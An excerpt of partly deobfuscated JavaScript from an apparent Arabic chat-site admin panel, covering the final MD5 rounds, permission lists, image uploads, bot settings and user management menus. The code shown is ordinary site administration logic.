    state_C = md5_H(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0xf], 0x10, 0x1fa27cf8);
    state_B = md5_H(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0x2], 0x17, 0xc4ac5665);

    // ==========================================
    // المرحلة الرابعة: تنفيذ دالة المعالجة md5_I (Round 4)
    // ==========================================
    state_A = md5_I(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x0], 0x6, 0xf4292244);
    state_D = md5_I(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0x7], 0xa, 0x432aff97);
    state_C = md5_I(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0xe], 0xf, 0xab9423a7);
    state_B = md5_I(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0x5], 0x15, 0xfc93a039);
    state_A = md5_I(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0xc], 0x6, 0x655b59c3);
    state_D = md5_I(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0x3], 0xa, 0x8f0ccc92);
    state_C = md5_I(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0xa], 0xf, 0xffeff47d);
    state_B = md5_I(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0x1], 0x15, 0x85845dd1);
    state_A = md5_I(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x8], 0x6, 0x6fa87e4f);
    state_D = md5_I(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0xf], 0xa, 0xfe2ce6e0);
    state_C = md5_I(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0x6], 0xf, 0xa3014314);
    state_B = md5_I(state_B, state_C, state_D, state_A, paddedWords[wordsArray + 0xd], 0x15, 0x4e0811a1);
    state_A = md5_I(state_A, state_B, state_C, state_D, paddedWords[wordsArray + 0x4], 0x6, 0xf7537e82);
    state_D = md5_I(state_D, state_A, state_B, state_C, paddedWords[wordsArray + 0xb], 0xa, 0xbd3af235);
    state_C = md5_I(state_C, state_D, state_A, state_B, paddedWords[wordsArray + 0x2], 0xf, 0x2ad7d2bb);
...
function filterAndRenderPowersList() {
  ...
  var filteredPowers = searchValue == '' ? activeAlerts : activeAlerts.filter(function (powerItem) {
    return powerItem.rank == searchValue || powerItem.name.indexOf(searchValue) != -0x1;
  });
  $("#cp .powerbox").children().remove();
  filteredPowers.sort(function (a, b) {
    return (b.rank || 0x0) - (a.rank || 0x0);
  });
  for (var i = 0x0; i < filteredPowers.length; i++) {
    $("#cp .powerbox").each(function (_0x228dfb, _0x42eb25) {
      var option = $("<option></option>");
      option.attr("value", filteredPowers[i].name);
      option.text('[' + (filteredPowers[i].rank || 0x0) + "] " + filteredPowers[i].name);
      $(_0x42eb25).append(option);
    });
    if (i == filteredPowers.length - 0x1) {
...
function renderSelectedPowerDetails() {
  ...
  for (var i = 0x0; i < powersArray.length; i++) {
...
function buildJsonEditForm(_0x429b2a, _0x83d4e6, _0x5bd102) {
  ...
  $.each(keysArray, function (_0x2726db, keyName) {
    ...
    if (_0x83d4e6 != null) {
      $.each(_0x83d4e6, function (_0x52b49f, labelPair) {
        if (labelPair[0x0] == keyName) {
          labelText = labelPair[0x1];
        }
        keysArray.splice(keysArray.indexOf(labelPair[0x0]), 0x1);
        keysArray.splice(_0x52b49f, 0x0, labelPair[0x0]);
      });
    }
    if (labelText == null) {
      return;
  ...
  formContainer.find("button").click(function () {
    _0x5bd102(collectFormValues(formContainer));
  });
  return formContainer;
}
function filterTableData(path, value) {
  sendAdminCommand('cp', {
    'cmd': "fltrit",
    'path': path,
    'v': value
...
function uploadImageWithProgress(_0x53ef96, _0x2eebd1) {
  var uploadRequest;
  openFilePicker("image/*", function (selectedFile) {
    ...
    uploadRequest = uploadFileToServer("pic?secid=u&fn=" + selectedFile.name.split('.').pop(), selectedFile, function (responseUrl) {
      _0x2eebd1(responseUrl);
      $(progressBox).remove();
    }, function () {
      $(progressBox).remove();
    }, function (progress) {
      $(progressBox.find(".fn")).text('%' + parseInt(progress * 0x64) + " | " + selectedFile.name.split("\\").pop());
    });
  });
}
function uploadAndSetImageSrc(_0x54f49b) {
...
function extractRootDomain(_0x310847) {
  ...
  var domainParts = _0x310847.indexOf('://') != -0x1 ? _0x310847.split("://")[0x1] : _0x310847;
  domainParts = domainParts.split('/')[0x0].split('.');
  return domainParts.length < 0x2 || domainParts[domainParts.length - 0x1] == '' ? '' : domainParts[domainParts.length - 0x2] + '.' + domainParts[domainParts.length - 0x1];
}
...
function uploadAdminImage(_0x114919, _0x1057cd) {
  ...
  openFilePicker("image/*", function (selectedFile) {
    ...
    uploadRequest = uploadFileToServer("upload?secid=u&a=x&fn=" + selectedFile.name.split('.').pop(), selectedFile, function (responseUrl) {
...
function addSupervisorIcon(pid) {
  sendAdminCommand('cp', {
    'cmd': "addico",
    'pid': pid,
    'tar': 'sico'
...
function deleteSupervisorIcon(element) {
  sendAdminCommand('cp', {
    'cmd': "delico",
...
function reorderEmojis() {
  $(".p-emo").append($(".p-emo div").remove().sort(function (a, b) {
    return parseInt($(a).find("input").val()) > parseInt($(b).find("input").val()) ? 0x1 : -0x1;
  }).each(function (index, emoElement) {
    emoElement = $(emoElement).find("input");
    emoElement.attr("onchange", '');
    emoElement.val(index + 0x1);
...
function formatLargeNumber(_0x4bf537) {
  ...
  switch (parts.length) {
    ...
    case 0x3:
      return parts[0x0] + '.' + parts[0x1][0x0] + 'M';
    case 0x4:
      return parts[0x0] + '.' + parts[0x1][0x0] + 'B';
  }
  return "999.9B";
}
function openFpsSearch(fingerprint) {
  if (cpWindow == null) {
...
function openBotManagementMenu(_0x2179bf, _0x2a7140) {
    ...
    switch (selectedOption) {
      case "الغرفه":
        openContextMenu(_0x2179bf, chatRoomsArray.filter(function (room) {
          ...
          if (matchedRoom.length) {
            $(_0x2179bf).parent().parent().find("td:eq(5)").text(matchedRoom[0x0].topic);
            sendAdminCommand('cp', {
              'cmd': "bot",
              'id': _0x2a7140,
              'or': matchedRoom[0x0].id
            });
          }
        });
        break;
      case "اللون":
        ...
        colorPicker.find('div').off().click(function () {
          var targetCell = $(_0x2179bf).parent().parent().find("td:eq(2)")[0x0];
      ...
      case "الزخرفه":
        ...
        if (typeof newTopic == "string" && newTopic.length > 0x1) {
          sendAdminCommand('cp', {
            'cmd': 'bot',
            'id': _0x2a7140,
            'topic': newTopic
      ...
      case "الوصف":
        ...
        if (typeof newDesc == "string" && newDesc.length > 0x1) {
          sendAdminCommand('cp', {
            'cmd': 'bot',
            'id': _0x2a7140,
            'msg': newDesc
      ...
      case "الدوله":
        ...
        if (typeof countryCode == "string" && countryCode.length == 0x2 && countryFlags[countryCode.toLowerCase()] != null) {
          sendAdminCommand('cp', {
            'cmd': "bot",
            'id': _0x2a7140,
...
function openBanSearchMenu(_0x2b5898, value, isLoginSearch) {
...
function openUserManagementMenu(_0x100283, userId) {
  openContextMenu(_0x100283, "الايكات,كلمه المرور,الصلاحيه,-----,حذف العضويه".split(','), function (selectedOption) {
    switch (selectedOption) {
      ...
      case "الصلاحيه":
        ...
        var optionsMap = {};
        for (var i = 0x0; i < activeAlerts.length; i++) {
          optionsMap['[' + activeAlerts[i].rank.toString().padStart(0x4, '0') + "] " + activeAlerts[i].name] = activeAlerts[i].name;
          optionsList.push('[' + activeAlerts[i].rank.toString().padStart(0x4, '0') + "] " + activeAlerts[i].name);
        }
          ...
          if (selectedPower == "سحب الصلاحيه") {
            ...
            if (selectedPower == "البحث") {
              ...
              if (searchQuery != null) {
                optionsList = [];
                optionsMap = {};
                for (var j = 0x0; j < activeAlerts.length; j++) {
                  var powerItem = activeAlerts[j];
                  if (powerItem.name.indexOf(searchQuery) != -0x1 || powerItem.rank == searchQuery) {
                    optionsMap['[' + activeAlerts[j].rank.toString().padStart(0x4, '0') + "] " + activeAlerts[j].name] = activeAlerts[j].name;
                    optionsList.push('[' + activeAlerts[j].rank.toString().padStart(0x4, '0') + "] " + activeAlerts[j].name);
                  }
                }
                optionsList.sort(function (a, b) {
                  return b.localeCompare(a);
